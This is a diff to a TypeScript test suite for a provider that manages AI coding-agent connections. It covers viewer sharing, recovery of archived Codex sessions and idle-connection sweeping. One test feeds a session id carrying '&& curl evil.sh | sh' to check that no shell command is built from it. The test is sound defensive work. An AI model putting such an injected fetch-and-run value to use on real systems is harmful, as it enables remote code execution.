@@ -7,6 +7,10 @@ import {
   useAcpActions,
   useConnectionStore,
 } from "@/contexts/acp-connections-context"
+import {
+  CONNECTION_IDLE_TIMEOUT_MS,
+  IDLE_SWEEP_INTERVAL_MS,
+} from "@/lib/constants"
 import { parsePermissionToolCall } from "@/lib/permission-request"
 import { subscribe } from "@/lib/platform"
 import { saveConfigPreference } from "@/lib/selector-prefs-storage"
@@ -49,11 +53,19 @@ const h = vi.hoisted(() => {
     pushAlert: vi.fn(),
     sendSystemNotification: vi.fn(async () => undefined),
     toastWarning: vi.fn(),
+    // Every `t(key, values)` this render made. The mock below still returns
+    // the bare key (what most assertions compare against), so interpolated
+    // values would otherwise be unobservable — this is how a test checks the
+    // *arguments* a message was built with, not just which key was picked.
+    tCalls: [] as Array<[string, Record<string, unknown> | undefined]>,
   }
 })
 
 vi.mock("next-intl", () => ({
-  useTranslations: () => (key: string) => key,
+  useTranslations: () => (key: string, values?: Record<string, unknown>) => {
+    h.tCalls.push([key, values])
+    return key
+  },
 }))
 
 vi.mock("@/lib/platform", () => ({
@@ -187,6 +199,7 @@ beforeEach(() => {
   h.acpTouchConnection.mockResolvedValue(true)
   h.acpCancel.mockReset()
   h.acpCancel.mockResolvedValue(undefined)
+  h.tCalls.length = 0
 })
 
 function latestAttachHandlers(): AttachHandlers {
@@ -263,6 +276,60 @@ describe("AcpConnectionsProvider cross-client viewer lifecycle", () => {
       expect.anything(),
       expect.anything()
     )
+  })
+
+  it("a SECOND local surface joins the connection this client owns instead of spawning another agent", async () => {
+    // The canvas expands a conversation that is already open in a workspace
+    // tab. Two surfaces, two contextKeys, ONE agent process: the second must
+    // take the viewer path exactly like a second browser client does.
+    h.acpFindConnectionForConversation.mockResolvedValue(null)
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/x", "sess-1", 42)
+    })
+    expect(h.acpConnect).toHaveBeenCalledTimes(1)
+
+    // Discovery now finds the connection THIS client owns under `TAB`.
+    h.acpFindConnectionForConversation.mockResolvedValue({
+      connection_id: "spawned-conn",
+      event_seq: 3,
+    })
+    await act(async () => {
+      await h.actions!.connect(
+        "canvas-node-7",
+        "claude_code",
+        "/tmp/x",
+        "sess-1",
+        42
+      )
+    })
+
+    // No second spawn, and the new surface is a non-owning viewer — so its
+    // teardown detaches instead of killing the tab's agent.
+    expect(h.acpConnect).toHaveBeenCalledTimes(1)
+    expect(h.store!.getConnection("canvas-node-7")?.isViewer).toBe(true)
+    expect(h.store!.getConnection(TAB)?.isViewer).toBe(false)
+  })
+
+  it("never demotes a surface to a viewer of its OWN connection", async () => {
+    // The guard this narrowing had to preserve: re-connecting the same key
+    // must not turn its owner entry into a viewer, or nothing would ever
+    // `acpDisconnect` and the agent process would leak.
+    h.acpFindConnectionForConversation.mockResolvedValue(null)
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/x", "sess-1", 42)
+    })
+
+    h.acpFindConnectionForConversation.mockResolvedValue({
+      connection_id: "spawned-conn",
+      event_seq: 3,
+    })
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/x", "sess-2", 42)
+    })
+
+    expect(h.store!.getConnection(TAB)?.isViewer).toBe(false)
   })
 
   it("skips discovery entirely when no persisted conversationId is given", async () => {
@@ -2274,6 +2341,170 @@ describe("empty-turn error diagnostics", () => {
   })
 })
 
+describe("session_load_failed archived-session recovery", () => {
+  async function connectOwner(agentType: string): Promise<AttachHandlers> {
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, agentType, "/tmp/x", "sess-1")
+    })
+    return latestAttachHandlers()
+  }
+
+  // The values the banner was built with, or undefined if it never asked for
+  // that message. (`findLast` is ES2023; this file targets ES2020.)
+  function lastArchivedCall() {
+    const calls = h.tCalls.filter(
+      ([key]) => key === "backendErrors.sessionArchived"
+    )
+    return calls[calls.length - 1]
+  }
+
+  const ARCHIVED_SID = "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47"
+  // What codex-acp actually answers session/load with after `codex archive`:
+  // a generic -32603 whose data spells out the session and the way back.
+  const RAW = `Internal error: {\n  "details": "session ${ARCHIVED_SID} is archived. Run \`codex unarchive ${ARCHIVED_SID}\` to restore it."\n}`
+
+  it("names the unarchive command using the id off the event, not the error body", async () => {
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(
+      "backendErrors.sessionArchived"
+    )
+    // The point of the banner: the exact command, built from the session the
+    // load failed for — no scraping of the (reword-able) error body.
+    expect(lastArchivedCall()?.[1]?.command).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+    // Parked beside the message too: the banner renders the prose in a
+    // single-line ellipsized strip, so the copy action is what actually
+    // gets the id into the user's hands.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+  })
+
+  it("still names the command when the error body does not spell out the id", async () => {
+    // The id is carried by the event, so the banner survives codex rewording
+    // its error text — the failure mode of recovering the id from the body.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: "Internal error: this session is archived",
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(
+      "backendErrors.sessionArchived"
+    )
+    expect(lastArchivedCall()?.[1]?.command).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+    // Parked beside the message too: the banner renders the prose in a
+    // single-line ellipsized strip, so the copy action is what actually
+    // gets the id into the user's hands.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+  })
+
+  it("refuses to build a shell command from a session id that isn't one", async () => {
+    // The command is meant to be pasted into a shell, so the id must be the
+    // whole of what gets interpolated. An id carrying a space and a second
+    // word would otherwise arrive as a second command.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47 && curl evil.sh | sh",
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
+  })
+
+  it("offers no command for the load failures that have no way back", async () => {
+    // resource_not_found / session_unavailable are genuinely lost sessions;
+    // a copy button would imply a recovery that does not exist.
+    const handlers = await connectOwner("codex")
+
+    const codes = ["resource_not_found", "session_unavailable"] as const
+    codes.forEach((code, i) => {
+      emitAcpEvent(handlers, {
+        seq: i + 1,
+        connection_id: "spawned-conn",
+        type: "session_load_failed",
+        session_id: ARCHIVED_SID,
+        message: RAW,
+        code,
+      })
+      expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+    })
+  })
+
+  it("drops the command when the load error is cleared", async () => {
+    // Reload clears the banner; a stale command would outlive the failure it
+    // belongs to and reappear beside the next one.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).not.toBeNull()
+
+    act(() => {
+      h.actions!.clearAcpLoadError(TAB)
+    })
+    expect(h.store!.getConnection(TAB)!.loadError).toBeNull()
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+  })
+
+  it("keeps the agent's own text rather than prescribing a codex command to a non-codex agent", async () => {
+    // The backend classifies on the wire message, so "is archived" is not
+    // codex-exclusive by construction. Telling a Claude user to run
+    // `codex unarchive` would be worse than showing the raw text.
+    const handlers = await connectOwner("claude_code")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
+    expect(
+      h.tCalls.some(([key]) => key === "backendErrors.sessionArchived")
+    ).toBe(false)
+    // No command either — the copy button must not appear offering a codex
+    // incantation to a Claude session.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+  })
+})
+
 describe("HYDRATE_FROM_SNAPSHOT last_error recovery", () => {
   // Full SnapshotPatch fixture; per-test overrides set connectionId / eventSeq /
   // lastError. `denormalizeSnapshot` is mocked, so onSnapshot dispatches exactly
@@ -3754,5 +3985,84 @@ describe("AcpConnectionsProvider retry banner (turn_retrying)", () => {
     })
 
     expect(h.store!.getConnection(TAB)?.claudeApiRetry?.attempt).toBe(1)
+  })
+})
+
+// The idle sweep reclaims any connection that is neither the single `activeKey`
+// nor an open TAB. Canvas conversation cards are neither — they live on a board
+// that has no tabs at all — so a second live card would have its agent
+// disconnected out from under the user after a minute of working in the first
+// one, while the card sat there still rendering as connected.
+describe("live surfaces that are not tabs", () => {
+  /** An owner sitting at `connected` — the only state the sweep reclaims. */
+  async function connectOwner(): Promise<void> {
+    h.acpFindConnectionForConversation.mockResolvedValue(null)
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/x", "sess-1", 42)
+    })
+    emitAcpEvent(latestAttachHandlers(), {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "turn_complete",
+      stop_reason: "end_turn",
+    } as EventEnvelope)
+  }
+
+  /** Run the sweep with this key having been idle well past the timeout. */
+  async function sweepPastIdleTimeout(): Promise<void> {
+    await act(async () => {
+      await vi.advanceTimersByTimeAsync(
+        CONNECTION_IDLE_TIMEOUT_MS + IDLE_SWEEP_INTERVAL_MS + 1000
+      )
+    })
+  }
+
+  it("reclaims an idle connection nothing claims to be showing", async () => {
+    vi.useFakeTimers()
+    try {
+      await connectOwner()
+      h.actions!.setActiveKey("some-other-surface")
+      await sweepPastIdleTimeout()
+      expect(h.acpDisconnect).toHaveBeenCalledWith("spawned-conn")
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  it("spares one a registered non-tab surface is still holding open", async () => {
+    vi.useFakeTimers()
+    try {
+      await connectOwner()
+      h.actions!.setActiveKey("some-other-surface")
+      h.actions!.registerLiveSurfaceKeys("canvas", new Set([TAB]))
+      await sweepPastIdleTimeout()
+      expect(h.acpDisconnect).not.toHaveBeenCalled()
+      expect(h.store!.getConnection(TAB)?.status).toBe("connected")
+
+      // The board unmounts (or the card collapses) and the claim is dropped —
+      // the connection goes back to being sweepable.
+      h.actions!.registerLiveSurfaceKeys("canvas", new Set())
+      await sweepPastIdleTimeout()
+      expect(h.acpDisconnect).toHaveBeenCalledWith("spawned-conn")
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  it("keeps each registrar's claims separate", async () => {
+    vi.useFakeTimers()
+    try {
+      await connectOwner()
+      h.actions!.setActiveKey("some-other-surface")
+      h.actions!.registerLiveSurfaceKeys("canvas", new Set([TAB]))
+      // A second registrar publishing its own (empty) set must not drop the
+      // first one's claim — that is exactly how a single shared set breaks.
+      h.actions!.registerLiveSurfaceKeys("pet-window", new Set())
+      await sweepPastIdleTimeout()
+      expect(h.acpDisconnect).not.toHaveBeenCalled()
+    } finally {
+      vi.useRealTimers()
+    }
   })
 })
